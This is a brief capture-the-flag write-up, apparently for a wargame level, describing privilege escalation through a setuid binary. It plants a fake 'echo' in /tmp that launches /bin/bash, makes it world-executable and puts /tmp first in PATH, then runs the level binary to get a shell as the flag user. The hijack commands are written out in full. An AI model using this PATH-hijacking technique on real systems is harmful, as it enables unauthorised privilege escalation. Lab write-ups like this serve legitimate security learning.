https://www.cgsecurity.org/Articles/SecProg/Art1/index-fr.html

https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code

https://askubuntu.com/questions/857066/meaning-of-the-access-permissions-rws-and-root-root-of-usr-bin-sudo

File has a weird CHMOD.

Security threat, can replace env variable

`echo "/bin/bash" > /tmp/echo`

Create a fake echo that will execute /bin/bash, that is a new connection to our shell with the current user's permission

`chmod 777 /tmp/echo`

otherwise the file is `-rw-rw-r-- 1 level03 level03 10 Sep 22 02:19 /tmp/echo` and flag03 can't execute it


`export PATH=/tmp:$PATH`

Do command `env` and see path went from:

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

to 

PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

So when calling env, the shell is going to read PATH variable to see where is the file to execute and will execute the first it finds, here our fake echo in tmp

then execute script `./level03`

You are now flag3 because you "opened" a new shell with the rights of flag03
